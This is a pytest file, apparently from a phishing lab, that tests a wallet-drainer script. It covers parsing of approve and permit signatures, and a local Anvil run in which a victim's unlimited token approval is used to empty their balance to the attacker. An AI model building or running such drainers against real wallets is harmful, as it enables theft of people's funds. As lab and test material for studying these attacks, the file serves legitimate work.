"""收割脚本(phishlab/drain.py)的单元与可选端到端测试。

L1:解析函数(approve 交易解析、permit 签名切分、字编码)纯逻辑,CI 常驻。
Anvil 模式(本机有 anvil/cast/forge 才跑,否则 skip):真实起链 + 部署演示代币,
走完"受害者 approve → 收割"全流程,断言受害者余额清零。
"""

import importlib.util
import json
import pathlib
import shutil
import socket
import subprocess
import sys
import time
import urllib.request
from contextlib import contextmanager

import pytest

_ROOT = pathlib.Path(__file__).parent.parent
_spec = importlib.util.spec_from_file_location("drain", _ROOT / "phishlab" / "drain.py")
drain = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(drain)

VICTIM = "0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266"
ATTACKER = drain.ATTACKER
VICTIM_KEY = "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80"
ATTACKER_KEY = drain.DEFAULT_ATTACKER_KEY


class TestParsePermitSig:
    def test_65_bytes_hex_prefixed(self):
        v, r, s = drain.parse_permit_sig("0x" + "11" * 32 + "22" * 32 + "1c")
        assert (v, r[:2], s[:2]) == (28, "11", "22")

    def test_v_0_1_normalizes_to_27_28(self):
        assert drain.parse_permit_sig("0x" + "ab" * 64 + "00")[0] == 27
        assert drain.parse_permit_sig("0x" + "ab" * 64 + "01")[0] == 28

    @pytest.mark.parametrize("sig", ["", "0x1234", "0x" + "ab" * 66])
    def test_bad_length_raises_systemexit(self, sig):
        with pytest.raises(SystemExit):
            drain.parse_permit_sig(sig)


def test_word_left_pads_address():
    assert drain._word("0xabcd") == "0" * 60 + "abcd"
    assert drain._word("ABCD") == "0" * 60 + "abcd"


class TestParseApproveTx:
    def test_parses_victim_spender_amount(self, monkeypatch):
        spender, amount = ATTACKER, 12345
        tx = {"from": VICTIM,
              "input": "0x" + drain.APPROVE + drain._word(spender) + hex(amount)[2:].rjust(64, "0")}
        monkeypatch.setattr(drain, "rpc", lambda url, m, p: tx if m == "eth_getTransactionByHash" else None)
        victim, got_spender, got_amount = drain.parse_approve_tx("http://x", "0xdead")
        assert (victim, got_spender, got_amount) == (VICTIM, spender.lower(), amount)

    def test_rejects_non_approve_selector(self, monkeypatch):
        tx = {"from": VICTIM, "input": "0x" + drain.TRANSFER_FROM + "00" * 96}
        monkeypatch.setattr(drain, "rpc", lambda url, m, p: tx)
        with pytest.raises(SystemExit, match="不是 approve"):
            drain.parse_approve_tx("http://x", "0xdead")

    def test_missing_tx_raises(self, monkeypatch):
        monkeypatch.setattr(drain, "rpc", lambda url, m, p: None)
        with pytest.raises(SystemExit, match="找不到"):
            drain.parse_approve_tx("http://x", "0xdead")


def _free_port():
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


def _cast(*args, timeout=60):
    cast = shutil.which("cast") or str(pathlib.Path.home() / ".foundry" / "bin" / "cast")
    return subprocess.run([cast, *args], capture_output=True, text=True, timeout=timeout)


def _have(tool):
    return bool(shutil.which(tool) or (pathlib.Path.home() / ".foundry" / "bin" / tool).exists())


@pytest.mark.skipif(not (_have("anvil") and _have("cast") and _have("forge")),
                    reason="需要 Foundry(anvil/cast/forge);L1 已覆盖解析逻辑")
class TestAnvilE2E:
    """真链收割:approve 场景受害者余额清零。permit 路径见 runbook 人工验收。"""

    @contextmanager
    def _chain(self):
        port = _free_port()
        anvil = shutil.which("anvil") or str(pathlib.Path.home() / ".foundry" / "bin" / "anvil")
        proc = subprocess.Popen(
            [anvil, "--chain-id", "31337", "--port", str(port)],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        )
        url = f"http://127.0.0.1:{port}"
        try:
            for _ in range(50):
                try:
                    urllib.request.urlopen(urllib.request.Request(
                        url, data=json.dumps({"jsonrpc": "2.0", "id": 1,
                                              "method": "eth_chainId", "params": []}).encode(),
                        headers={"Content-Type": "application/json"}), timeout=2)
                    break
                except Exception:
                    time.sleep(0.2)
            else:
                pytest.fail("anvil 10 秒内未就绪")
            yield url
        finally:
            proc.terminate()
            proc.wait(timeout=10)

    def _deploy_token(self, url):
        forge = shutil.which("forge") or str(pathlib.Path.home() / ".foundry" / "bin" / "forge")
        out = subprocess.run(
            [forge, "create", "PhishingToken", "--broadcast", "--root", str(_ROOT / "phishlab" / "contracts"),
             "--private-key", ATTACKER_KEY, "--rpc-url", url],
            capture_output=True, text=True, timeout=300,
        )
        for line in out.stdout.splitlines():
            if line.startswith("Deployed to:"):
                return line.split()[2]
        pytest.fail(f"代币部署失败:\n{out.stdout}\n{out.stderr}")

    def test_approve_drain_empties_victim(self):
        with self._chain() as url:
            token = self._deploy_token(url)
            # 攻击者给受害者 1000 枚(模拟此前领取的空投)
            assert _cast("send", token, "transfer(address,uint256)", VICTIM,
                         "1000000000000000000000", "--private-key", ATTACKER_KEY,
                         "--rpc-url", url).returncode == 0
            # 受害者在钓鱼页签"无限授权"(MetaMask 会发同样的交易)
            assert _cast("send", token, "approve(address,uint256)", ATTACKER,
                         hex(2**256 - 1), "--private-key", VICTIM_KEY,
                         "--rpc-url", url).returncode == 0
            # 从最新块取受害者那笔 approve 交易哈希
            block = json.loads(urllib.request.urlopen(urllib.request.Request(
                url, data=json.dumps({"jsonrpc": "2.0", "id": 1, "method": "eth_getBlockByNumber",
                                      "params": ["latest", True]}).encode(),
                headers={"Content-Type": "application/json"})).read())["result"]
            txhash = block["transactions"][-1]["hash"]
            # 收割
            rc = subprocess.run(
                [sys.executable, str(_ROOT / "phishlab" / "drain.py"), "--rpc", url,
                 "--tx", txhash, "--token", token],
                capture_output=True, text=True, timeout=120,
            )
            assert rc.returncode == 0, (rc.stdout, rc.stderr)
            assert "→ 0" in rc.stdout
            vb = drain.balance_of(url, token, VICTIM)
            ab = drain.balance_of(url, token, ATTACKER)
            assert vb == 0
            assert ab == 10**21 + 1_000_000 * 10**18 - 10**21  # 受害者 1000 + 部署者初始 - 转出
